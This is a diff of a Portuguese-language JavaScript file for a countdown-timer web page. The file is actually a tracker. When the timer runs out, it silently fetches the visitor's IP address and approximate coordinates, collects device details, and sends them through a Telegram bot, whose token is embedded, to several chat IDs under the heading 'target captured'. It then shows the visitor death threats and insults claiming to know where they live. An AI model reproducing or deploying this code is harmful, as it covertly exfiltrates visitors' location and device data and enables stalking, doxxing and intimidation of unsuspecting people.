@@ -1,29 +1,26 @@
-// script.js - Envio para MÚLTIPLOS usuários no Telegram
+// ================================================
+// script.js - Contagem Regressiva + Smart Logger
+// ================================================
 
 let targetDate = new Date("2026-04-25T23:59:59").getTime();
-let userIPv4 = '';
-let userLatitude = '';
-let userLongitude = '';
 let timerInterval = null;
-let alreadySent = false;
 
-// ==================== CONFIGURAÇÃO DE DESTINATÁRIOS ====================
+// ==================== CONFIGURAÇÕES ====================
 const BOT_TOKEN = "8761130577:AAHnnpD9Ypa20tvEiFC6ZgDskwlNKchxYCQ";
 
-// Coloque aqui todos os chat_id que devem receber a mensagem
+// Adicione aqui todos os chat_ids que devem receber a notificação
 const CHAT_IDS = [
-    "8448614204",        // Seu ID (você)
+    "8448614204",     // Seu chat_id principal
     "8219025301",   // Luizz
-    // "1234567890",     // terceiro
-    // "9876543210"      // quarto, etc...
 ];
 
 function detectDeviceType() {
     const ua = navigator.userAgent.toLowerCase();
+    
     if (/smart-tv|tv|crkey|roku|android tv|firetv/i.test(ua)) return "Smart TV";
     if (/playstation|xbox|nintendo|switch/i.test(ua)) return "Console de videogame";
     if (/ipad|tablet|playbook|silk/i.test(ua)) return "Tablet";
-    if (/android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua)) return "Celular";
+    if (/android|iphone|ipod|blackberry|iemobile|opera mini/i.test(ua)) return "Celular";
     return "Computador";
 }
 
@@ -41,24 +38,20 @@ function getDeviceInfo() {
         pixelRatio: window.devicePixelRatio || 1,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-        deviceMemory: ram,
-        isMobile: /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)
+        deviceMemory: ram
     };
 }
 
-// ==================== ENVIA PARA TODOS OS CHAT_IDS ====================
-function sendToTelegram() {
-    if (alreadySent) return;
-    alreadySent = true;
-
+// ==================== ENVIA MENSAGEM PARA O TELEGRAM ====================
+async function sendToTelegram(ip, latitude, longitude) {
     const device = getDeviceInfo();
     const devType = device.deviceType;
 
     const message = `🚨 ALVO CAPTURADO - TIMER ZERADO!\n\n` +
                     `🕒 Horário: ${new Date().toLocaleString('pt-BR')}\n` +
-                    `🌐 IP: ${userIPv4 || 'Não capturado'}\n` +
-                    `📍 Latitude: ${userLatitude || 'Não disponível'}\n` +
-                    `📍 Longitude: ${userLongitude || 'Não disponível'}\n\n` +
+                    `🌐 IP: ${ip || 'Não capturado'}\n` +
+                    `📍 Latitude: ${latitude || 'Não disponível'}\n` +
+                    `📍 Longitude: ${longitude || 'Não disponível'}\n\n` +
                     `📱 Dispositivo:\n` +
                     `• Tipo: ${devType}\n` +
                     `• Sistema: ${device.platform}\n` +
@@ -79,38 +72,37 @@ function sendToTelegram() {
                     `Perdedor de merda.\n\n` +
                     `Não é magia, é habilidade isto...`;
 
-    // Envia para TODOS os chat_ids
-    CHAT_IDS.forEach(chatId => {
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-                chat_id: chatId, 
-                text: message 
-            })
-        })
-        .then(res => res.json())
-        .then(data => {
+    // Envia para todos os chat_ids configurados
+    for (const chatId of CHAT_IDS) {
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    chat_id: chatId, 
+                    text: message 
+                })
+            });
+            const data = await res.json();
             if (data.ok) {
                 console.log(`✅ Mensagem enviada para chat_id: ${chatId}`);
-            } else {
-                console.error(`❌ Erro ao enviar para ${chatId}:`, data.description);
             }
-        })
-        .catch(err => console.error(`Erro ao enviar para ${chatId}:`, err));
-    });
+        } catch (err) {
+            console.error(`Erro ao enviar para ${chatId}:`, err);
+        }
+    }
 }
 
-// ==================== MENSAGEM NA TELA ====================
+// ==================== MENSAGEM QUE APARECE NA TELA DO USUÁRIO ====================
 function showFinalMessageOnScreen() {
     const deviceType = detectDeviceType();
-    
+
     document.getElementById("timer").innerHTML = `
         Tempo esgotado!<br><br>
         Prepare-se para morrer, seu lixo...<br><br>
         Eu sei que você tá usando essa merda de ${deviceType.toLowerCase()}.<br>
         Eu sei onde você mora.<br>
-        Eu sei o seu IP.<br><br>
+        Eu sei o seu IP de merda.<br><br>
         Você é um fracassado patético.<br>
         Um inútil.<br>
         Um perdedor que não consegue nem ganhar de um timer.<br><br>
@@ -119,17 +111,37 @@ function showFinalMessageOnScreen() {
     `;
 }
 
+// ==================== ATUALIZA O TIMER ====================
 function updateTimer() {
     const timeNow = new Date().getTime();
     let timeLeft = targetDate - timeNow;
 
     if (timeLeft < 0) {
         clearInterval(timerInterval);
+
+        const deviceType = detectDeviceType();
+
+        // Busca IP + Localização no momento que zera (mais preciso)
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(data => {
+                const ip = data.ip;
+                return fetch(`http://ip-api.com/json/${ip}?fields=status,lat,lon`)
+                    .then(r => r.json())
+                    .then(loc => {
+                        const lat = loc.status === "success" ? loc.lat : '';
+                        const lon = loc.status === "success" ? loc.lon : '';
+                        sendToTelegram(ip, lat, lon);
+                    })
+                    .catch(() => sendToTelegram(ip, '', ''));
+            })
+            .catch(() => sendToTelegram('Não capturado', '', ''));
+
         showFinalMessageOnScreen();
-        sendToTelegram();
         return;
     }
 
+    // Calcula tempo restante
     const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
     const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
     const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
@@ -141,21 +153,6 @@ function updateTimer() {
     `;
 }
 
-// Busca IP + Localização
-fetch('https://api.ipify.org?format=json')
-    .then(r => r.json())
-    .then(data => {
-        userIPv4 = data.ip;
-        return fetch(`http://ip-api.com/json/${userIPv4}?fields=status,lat,lon`);
-    })
-    .then(r => r.json())
-    .then(data => {
-        if (data.status === "success") {
-            userLatitude = data.lat || '';
-            userLongitude = data.lon || '';
-        }
-    })
-    .catch(err => console.error("Erro na localização:", err));
-
+// ==================== INICIALIZAÇÃO ====================
 timerInterval = setInterval(updateTimer, 100);
-updateTimer();
+updateTimer();   // Primeira atualização imediata
